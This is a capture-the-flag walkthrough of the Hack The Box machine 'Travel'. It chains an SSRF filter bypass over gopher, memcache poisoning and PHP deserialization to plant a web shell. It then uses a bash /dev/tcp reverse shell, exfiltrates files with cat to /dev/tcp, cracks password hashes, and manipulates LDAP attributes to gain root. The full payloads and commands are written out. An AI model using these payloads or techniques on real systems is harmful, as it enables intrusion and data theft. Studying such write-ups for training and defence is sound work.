---
title: "Travel Walkthrough(Hack The Box)"
date: 2025-03-20
draft: true
description: "A straight forward walkthrough of the box Travel from Hack The Box"
tags: ["Hard", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
---
## Reconnaissance & Enumeration #Linux 
- Nmap scan results:
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d3:9f:31:95:7e:5e:11:45:a2:b4:b6:34:c0:2d:2d:bc (RSA)
|   256 ef:3f:44:21:46:8d:eb:6c:39:9c:78:4f:50:b3:f3:6b (ECDSA)
|_  256 3a:01:bc:f8:57:f5:27:a1:68:1d:6a:3d:4e:bc:21:1b (ED25519)
80/tcp  open  http     nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.Hack The Box
| http-methods: 
|_  Supported Methods: GET HEAD
443/tcp open  ssl/http nginx 1.17.6
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Travel.Hack The Box - SSL coming soon.
|_http-server-header: nginx/1.17.6
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.Hack The Box/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Issuer: commonName=www.travel.htb/organizationName=Travel.Hack The Box/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-23T19:24:29
| Not valid after:  2030-04-21T19:24:29
| MD5:   ef0a:a4c1:fbad:1ac4:d160:58e3:beac:9698
|_SHA-1: 0170:7c30:db3e:2a93:cda7:7bbe:8a8b:7777:5bcd:0498
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/27%OT=22%CT=1%CU=40449%PV=Y%DS=2%DC=T%G=Y%TM=67C054B
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=106%GCD=2%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=10A%GCD=1%ISR=10A%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=FB%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GCD
OS:=1%ISR=110%TI=Z%CI=Z%TS=A)ECN(R=N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=
OS:)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 8.774 days (since Tue Feb 18 22:59:32 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   289.20 ms 10.10.14.1
2   289.29 ms 10.10.10.189


```
- Surprisingly there are three ports open with 433 being the unusal .
- I can see the domain names from the nmap scan.
- There were some interesting information that I stumbled upon while on the reconnaissance process
	- I learnt about `hello@travel.htb` from the home page of port 80
	- There were some pretty good filter on the `email` subscribe field
	- ![[Pasted image 20250227175233.png]]
	- I found this j-query page, So I thought there could be api endpoints but there wasn't
	- ![[Pasted image 20250227175402.png]]
- On port 443 got this 
- ![[Pasted image 20250227175537.png]]
- `blog.travel.htb` had a pretty good page and it made of wordpress.
- ![[Pasted image 20250227180045.png]]
- I ran `wpscan` against this website and found some interesting stuffs
```
Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.17.6
 |  - X-Powered-By: PHP/7.3.16
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.travel.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.travel.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.travel.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.travel.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4 identified (Insecure, released on 2020-03-31).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.travel.htb/feed/, <generator>https://wordpress.org/?v=5.4</generator>
 |  - http://blog.travel.htb/comments/feed/, <generator>https://wordpress.org/?v=5.4</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.travel.htb/wp-content/themes/twentytwenty/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.travel.htb/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

```
- But there were nothing useful
- When I try to access `blog-dev.travel.htb` I get `403` but If I fuzz the URL I can see exposed `.git` 
- From the `git` dump I can see three files `README.md`,`rss_template.php`,`template.php` respectively
- The file `README.md` exposed some information by exposing this content
```
# Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup

* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php & template.php to `wp-content/themes/twentytwenty` 
* create logs directory in `wp-content/themes/twentytwenty` 
* create page in backend and choose rss_template.php as theme

## Changelog

- temporarily disabled cache compression
- added additional security checks 
- added caching
- added rss template

## ToDo

- finish logging implementation
```
- The file `rss_template.php` had this code:
```php
<?php
/*
Template Name: Awesome RSS
*/
include('template.php');
get_header();
?>

<main class="section-inner">
	<?php
	function get_feed($url){
     require_once ABSPATH . '/wp-includes/class-simplepie.php';	    
     $simplepie = null;	  
     $data = url_get_contents($url);
     if ($url) {
         $simplepie = new SimplePie();
         $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
         //$simplepie->set_raw_data($data);
         $simplepie->set_feed_url($url);
         $simplepie->init();
         $simplepie->handle_content_type();
         if ($simplepie->error) {
             error_log($simplepie->error);
             $simplepie = null;
             $failed = True;
         }
     } else {
         $failed = True;
     }
     return $simplepie;
 	 }

 	$url = $_SERVER['QUERY_STRING'];
	if(strpos($url, "custom_feed_url") !== false){
		$tmp = (explode("=", $url)); 	
		$url = end($tmp); 	
 	 } else {
 	 	$url = "http://www.travel.htb/newsfeed/customfeed.xml";
 	 }
 	 $feed = get_feed($url); 
     if ($feed->error())
		{
			echo '<div class="sp_errors">' . "\r\n";
			echo '<p>' . htmlspecialchars($feed->error()) . "</p>\r\n";
			echo '</div>' . "\r\n";
		}
		else {
	?>
	<div class="chunk focus">
		<h3 class="header">
		<?php 
			$link = $feed->get_link();
			$title = $feed->get_title();
			if ($link) 
			{ 
				$title = "<a href='$link' title='$title'>$title</a>"; 
			}
			echo $title;
		?>
		</h3>
		<?php echo $feed->get_description(); ?>

	</div>
	<?php foreach($feed->get_items() as $item): ?>
		<div class="chunk">
			<h4><?php if ($item->get_permalink()) echo '<a href="' . $item->get_permalink() . '">'; echo $item->get_title(); if ($item->get_permalink()) echo '</a>'; ?>&nbsp;<span class="footnote"><?php echo $item->get_date('j M Y, g:i a'); ?></span></h4>
			<?php echo $item->get_content(); ?>
			<?php
			if ($enclosure = $item->get_enclosure(0))
			{
				echo '<div align="center">';
				echo '<p>' . $enclosure->embed(array(
					'audio' => './for_the_demo/place_audio.png',
					'video' => './for_the_demo/place_video.png',
					'mediaplayer' => './for_the_demo/mediaplayer.swf',
					'altclass' => 'download'
				)) . '</p>';
				if ($enclosure->get_link() && $enclosure->get_type())
				{
					echo '<p class="footnote" align="center">(' . $enclosure->get_type();
					if ($enclosure->get_size())
					{
						echo '; ' . $enclosure->get_size() . ' MB';
					}
					echo ')</p>';
				}
				if ($enclosure->get_thumbnail())
				{
					echo '<div><img src="' . $enclosure->get_thumbnail() . '" alt="" /></div>';
				}
				echo '</div>';
			}
			?>

		</div>
	<?php endforeach; ?>
<?php } ?>
</main>

<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->

<?php get_template_part( 'template-parts/footer-menus-widgets' ); ?>

<?php
get_footer();
```
- `rss_template.php` is the source code for `Awesome RSS` which is from the web page `blog.travel.htb`
- This following code uses `memcache` for caching and the format is with `xct_` as prefix to the cached data.
```php
     if ($url) {
         $simplepie = new SimplePie();
         $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
```
- This function `get_feed` gets the URL for feed.
```php
	$url = $_SERVER['QUERY_STRING'];
	if(strpos($url, "custom_feed_url") !== false){
		$tmp = (explode("=", $url)); 	
		$url = end($tmp); 	
 	 } else {
 	 	$url = "http://www.travel.htb/newsfeed/customfeed.xml";
 	 }
 	 $feed = get_feed($url); 
```
- `customefeed.xml` has the data in `xml` format, and the contents mach `Awesome RSS`
- ![[Pasted image 20250227222045.png]]
- Again this code function requests query string `custom_feed_url` for `customfeed.xml`
```php
 	$url = $_SERVER['QUERY_STRING'];
	if(strpos($url, "custom_feed_url") !== false){
		$tmp = (explode("=", $url)); 	
		$url = end($tmp); 	
 	 } else {
 	 	$url = "http://www.travel.htb/newsfeed/customfeed.xml";
 	 }

```

- If the condition satisfies then it splits the URL with `'='` with `explode` like this `awesome-rss/?custom_feed_url=QUERY_STRING`. Else it will simply sets the `url` to `http://www.travel.htb/newsfeed/customfeed.xml`
- So we can make the URL to look like this:
```
http://blog.travel.htb/awesome-rss?custom_feed_url&rss=http://10.10.14.16/rss
```
- Sent a curl request with this URL
- ![[Pasted image 20250227224728.png]]
- Got a hit on my listener 
- ![[Pasted image 20250227224801.png]]
- At end of the source code we can see code for `debug` page. But It's within html comments
```html
<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->
```
- There wan't any difference in visiting `debug` it just returns the same page 
- ![[Pasted image 20250227225459.png]]
- But from the source code we can see. At first it was empty on refreshing it showed the cached value
- ![[Pasted image 20250227225753.png]]
- We can do the same using curl
```bash
diff <(curl -s 'http://blog.travel.htb/awesome-rss/?debug') <(curl -s http://blog.travel.htb/awesome-rss/)
```
- First try
	- ![[Pasted image 20250227225907.png]]
- Second try
	- ![[Pasted image 20250227225941.png]]
- This was the contents from `template.php` 
```php
<?php

/**
 Todo: finish logging implementation via TemplateHelper
*/

function safe($url)
{
	// this should be secure
	$tmpUrl = urldecode($url);
	if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
	{		
		die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
	}
	if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
	{		
		die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
	}
	$tmp = parse_url($url, PHP_URL_HOST);
	// preventing all localhost access
	if($tmp == "localhost" or $tmp == "127.0.0.1")
	{		
		die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");		
	}
	return $url;
}

function url_get_contents ($url) {
    $url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	$output = shell_exec($pl);
    return $output;
}


class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    	
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}

```
- `template.php` mainly had the code for security mechanisms to `custom_feed_url` 
- The code mainly checks for:
	1. `file://` or  `@` ---> Local file Inclusion attacks
	2. `-o` or `-F` ---> Command Injection
	3. `localhost` or `127.0.0.1` ---> Server Side Request Forgery
- If the above conditions satisfied then the PHP code exits and records attempts to `/logs/`
- There is an workaround for this, I can use [Gopher](https://en.wikipedia.org/wiki/Gopher_(protocol)) protocol instead of http with decimal representation of local host.
- Gopher is very old protocol used before http and delivers the message without any useless headers.
- **Testing:**
	- I can test gopher using this 
```
curl -s 'gopher://10.10.14.16:6001//testing'
```
- I can see that gopher successfully transfers the message without any headers
- ![[Pasted image 20250228103856.png]]
- Now I tested for the `memcache` , I saved a local copy of `customfeed.xml` as `sec.xml`
- ![[Pasted image 20250228104112.png]]
- I requested this file using SSRF 
```
curl -s http://blog.travel.htb/awesome-rss/\?custom_feed_url=http://10.10.14.16:8000/sec.xml
```
- Actually It saved the file into it's caching. Now I can see two data 
- ![[Pasted image 20250228104408.png]]
- This definitely could be a hash generated.
**Poisoning Memcache:**
- Next I called for the local host using Gopher
- [Gopherus](https://github.com/tarunkant/Gopherus) is a tool that generates SSRF payloads using gopher protocol. 
- For the texting I gave `exploitEmp5r0R` as a payload value
- ![[Pasted image 20250228105632.png]]
- Now I replace the localhost with it's decimal representation which is `2130706433` . Hex value is also applicable 
- Now the payloads becomes
```
http://blog.travel.htb/awesome-rss/\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a
```
- Sent it using curl
```
curl -s http://blog.travel.htb/awesome-rss/\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a
```
- ![[Pasted image 20250228105938.png]]
- With `debug` I can see that it worked
- ![[Pasted image 20250228110046.png]]
- As this is a MD5 generated we could also recreate it. This cache gets md5 hash for customfeed.xml as whole URL
```
echo -n "http://www.travel.htb/newsfeed/customfeed.xml" | md5sum
```
- Like the above. Now the memcache get's another md5 sum for the output of above hash with key `spc`. I learnt about this while googling `memcache`. I could see the whole source code on the internet.
- ![[Pasted image 20250228112509.png]]
- Now lets make another with the key `spc`
```
echo -n "3903a76d1e6fef0d76e973a0561cbfc0:spc" | md5sum
```
- ![[Pasted image 20250228112555.png]]
- I can see the hash value matches to the value from debug
- ![[Pasted image 20250228112654.png]]
 
## Exploitation
 **Creating Payload:**
 - I can generate the serialized object by tweaking `template.php` code a little by injecting a payload
 ```php
 <?php
class TemplateHelper
{
public $file;
public $data;
public function __construct(string $file, string $data)
{
$this->init($file, $data);
}
private function init(string $file, string $data)
{
$this->file = $file;
$this->data = $data;
file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
}
}
$pwn = new TemplateHelper("shell.php", "<?php system(\$_GET[emperor]); ?>");
echo serialize($pwn);
?>

```
- This code will generate a serialized object for the malicious payload which will be saved as `shell.php` within the `logs` folder.
- Actually running the php code locally we can see the process. But first let me create a directory called `logs`
```
php exploit.php
```
- ![[Pasted image 20250228114813.png]]
- I can see the payload too in my local system
- ![[Pasted image 20250228114847.png]]
- Now I fed the payload generated by our script to `gopherus`
- ![[Pasted image 20250228114951.png]]
- This was the output I got while doing that
```
gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_GET%5Bemperor%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
```
- Now I replaced bunch of things in the payload given by `Gopherus`
	- First I replaced `localhost` to it's decimal representation which is `2130706433`
	- Second I replaced `SpyD3r` to the hash we generated earlier also by including the prefix which is `xct_4e5612ba079c530a6b1f148c0b352241`
- The final payload would be 
```
http://blog.travel.htb/awesome-rss/\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_GET%5Bemperor%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
```
-  Sent it using curl
- ![[Pasted image 20250228115417.png]]
- Now If I got to `http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?0=id` I can access the `shell.php`
- Which worked very well
- ![[Pasted image 20250228115554.png]]
- To get a reverse shell lets change the `id` command with url encoded bash payload which would be
```
bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E10%2E14%2E16%2F6001%20%3C%261%27
```
- The final **URL for reverse shell** would be
```
http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?emperor=bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E10%2E14%2E16%2F6001%20%3C%261%27
```
- I got the reverse shell
- I performed some **shell up gradation** 
```
/usr/bin/script -qc /bin/bash /dev/null
```
- Then for `clear` command
```
export TERM=xterm
```
- Press **CTRL+Z**
- Then after
```
stty raw -echo; fg
```
- Atlast
```
stty rows 38 columns 116
```
- ![[Pasted image 20250228120138.png]]
## Pivoting
- The directory `/opt/wordpress` has a `sql` database file
- So transferred the file using this
```
cat backup-13-04-2020.sql > /dev/tcp/10.10.14.16/8001
```
- If I search for `admin` using `grep` I can get two hashes
- ![[Pasted image 20250228121321.png]]
- Only one hash could be cracked. Hash for  user `lynik-admin` can be cracked
```
hashcat hashes /usr/share/wordlists/rockyou.txt
```
- ![[Pasted image 20250228121920.png]]
- We have ssh access for user `lynik-admin`
## Privilege Escalation
- In the home directory of `lynik-admin` , I can see a hidden file `.ldaprc`.
- ![[Pasted image 20250228163300.png]]
- Which is particularly interesting, This [article](https://www.mkssoftware.com/docs/man5/ldap_config.5.asp) says that the file `ldaprc` holds the configuration for `LDAP` clients.
- ![[Pasted image 20250228163610.png]]
- The file contents are:-
	- ![[Pasted image 20250228163642.png]]
- I enumerated the domain with some basic commands 
- ![[Pasted image 20250228163936.png]]
- There was another interesting file hidden within the home directory which is `.viminfo`
- Basically `.viminfo` file will hold serialized data of modification done through vim editor.
- ![[Pasted image 20250228164514.png]]
- Contents of `.viminfo`:
```
# This viminfo file was generated by Vim 8.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq!
|2,0,1587670530,,"wq!"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
""1	LINE	0
	BINDPW <SNIP>
|3,1,1,1,1,0,1587670528,"BINDPW <SNIP>"

# File marks:
'0  3  0  ~/.ldaprc
|4,48,3,0,1587670530,"~/.ldaprc"

# Jumplist (newest first):
-'  3  0  ~/.ldaprc
|4,39,3,0,1587670530,"~/.ldaprc"
-'  1  0  ~/.ldaprc
|4,39,1,0,1587670527,"~/.ldaprc"

# History of marks within files (newest to oldest):

> ~/.ldaprc
	*	1587670529	0
	"	3	0
	.	4	0
	+	4	0

```
- There was a word which looked like a password so I redacted that particular data and gave you the contents
- Usually the #LDAP listens on port 389. We can do a quick bash scan to confirm it
```
for port in {1..65535}; do echo > /dev/tcp/172.20.0.10/$port && echo "$port open"; done 2>/dev/null
```
- Actually there is another port open which is `639` along with `389`
- First lemme forward the port 389 to my system.
```
ssh -L 389:172.20.0.10:389 lynik-admin@travel.htb
```
- The password from `.viminfo` actually works
```
ldapsearch -H ldap://127.0.0.1  -w <SNIP> -b "DC=travel,DC=htb" -D 'CN=lynik-admin,DC=travel,dc=htb'
```
- ![[Pasted image 20250228170736.png]]
- This user actually is a admin to LDAP which will help a lot
- The PAM configuration for su reveals something. Location of the file: `/etc/pam.d/su`
```
#
# The PAM configuration file for the Shadow `su' service
#

# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so

# Uncomment this to force users to be a member of group root
# before they can use `su'. You can also add "group=foo"
# to the end of this line if you want to use a group other
# than the default "root" (but this may have side effect of
# denying "root" user, unless she's a member of "foo" or explicitly
# permitted earlier by e.g. "sufficient pam_rootok.so").
# (Replaces the `SU_WHEEL_ONLY' option from login.defs)
auth       required   pam_wheel.so

# Uncomment this if you want wheel members to be able to
# su without a password.
# auth       sufficient pam_wheel.so trust

# Uncomment this if you want members of a specific group to not
# be allowed to use su at all.
# auth       required   pam_wheel.so deny group=nosu

# Uncomment and edit /etc/security/time.conf if you need to set
# time restrainst on su usage.
# (Replaces the `PORTTIME_CHECKS_ENAB' option from login.defs
# as well as /etc/porttime)
# account    requisite  pam_time.so

# This module parses environment configuration file(s)
# and also allows you to use an extended config
# file /etc/security/pam_env.conf.
# 
# parsing /etc/environment needs "readenv=1"
session       required   pam_env.so readenv=1
# locale variables are also kept into /etc/default/locale in etch
# reading this file *in addition to /etc/environment* does not hurt
session       required   pam_env.so readenv=1 envfile=/etc/default/locale

# Defines the MAIL environment variable
# However, userdel also needs MAIL_DIR and MAIL_FILE variables
# in /etc/login.defs to make sure that removing a user 
# also removes the user's mail spool file.
# See comments in /etc/login.defs
#
# "nopen" stands to avoid reporting new mail when su'ing to another user
session    optional   pam_mail.so nopen

# Sets up user limits according to /etc/security/limits.conf
# (Replaces the use of /etc/limits in old login)
session    required   pam_limits.so

# The standard Unix authentication modules, used with
# NIS (man nsswitch) as well as normal /etc/passwd and
# /etc/shadow entries.
@include common-auth
@include common-account
@include common-session

```
- The configuration allows only the members of wheel group to switch to other users. Attempts to SSH as this user also fail, as the server denies password-based authentication.
- The ssh configuration file also gives us more details regarding this. `/etc/ssh/ssh_config` and`/etc/ssh/sshd_config
- The sss_ssh_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute in LDAP
- Lets try changing the password of user `lynik` to password of our choice
- Click on new Attribute and type `userPassword` then click finish after that a dialogue box will prompt asking for new password. Enter the password, click finish.
- ![[Pasted image 20250301003838.png]]
- I can see the commands used for this, below.
- ![[Pasted image 20250301003943.png]]
- To login as user `lynik` I have to put the public key via LDAP
- Now to login using ssh I created keys using `ssh-keygen` and then copied the public key.
- ![[Pasted image 20250301005213.png]]
- In Apache directory studio create new attribute `objectClass` and the click finish
- Then on the prompt select `ldapPublickey`, click finish after selecting it.
- Create another attribute `sshPublickey` then on the prompt click "edit as text", after paste the public key. Click finish.
- Transferred the private key to my system.
```
cat id_rsa > /dev/tcp/10.10.14.16/8001
```
- After giving necessary permissions, using that to login as user `lynik`
- I can see user `lynik` group is `5000`
- ![[Pasted image 20250301010405.png]]
- I can actually change the group to root group. But first I have to find the UID for root group
```
cat /etc/group | grep -i sudo
```
- ![[Pasted image 20250301010513.png]]
- Found root group to be `27` so changed the group ID to `27` in the LDAP.
- ![[Pasted image 20250301010953.png]]
- After re-login I can see the changes
- ![[Pasted image 20250301011035.png]]
- Got the root flag.
- ![[Pasted image 20250301011304.png]]
